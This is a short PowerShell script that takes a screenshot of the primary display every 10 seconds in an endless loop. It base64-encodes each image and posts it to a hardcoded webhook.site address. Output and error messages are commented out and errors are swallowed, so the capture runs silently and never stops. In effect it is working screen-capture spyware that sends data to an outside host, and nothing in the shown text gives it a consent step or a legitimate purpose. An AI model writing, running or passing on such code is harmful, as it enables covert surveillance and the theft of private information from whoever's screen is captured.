function Send-ScreenCaptureToWebhook {
    param(
        [string]$WebhookUrl
    )

    begin {
        Add-Type -AssemblyName System.Drawing, System.Windows.Forms
    }

    process {
        try {
            # Get screen dimensions
            $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds

            # Create a bitmap of the screen
            $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
            $graphics = [System.Drawing.Graphics]::FromImage($bitmap)

            # Copy the screen to the bitmap
            $graphics.CopyFromScreen(0, 0, 0, 0, $screen.Size)

            # Save the bitmap to a memory stream as PNG
            $memoryStream = New-Object System.IO.MemoryStream
            $bitmap.Save($memoryStream, [System.Drawing.Imaging.ImageFormat]::Png)
            $imageBytes = $memoryStream.ToArray()

            # Base64 encode the image bytes
            $base64Image = [Convert]::ToBase64String($imageBytes)

            # Send the base64 string to the webhook
            $body = @{ "image" = $base64Image } | ConvertTo-Json

            $null = Invoke-WebRequest -Uri $WebhookUrl -Method Post -Body $body -ContentType "application/json"

            # Write-Host "Screenshot sent successfully."

        } catch {
            # Write-Error "Failed to send screenshot: $_"
        }
    }
}

$webhook = "https://webhook.site/2911c139-ed87-4411-a940-58458f44ebb1"

while ($true) {
    Send-ScreenCaptureToWebhook -WebhookUrl $webhook
    Start-Sleep -Seconds 10
}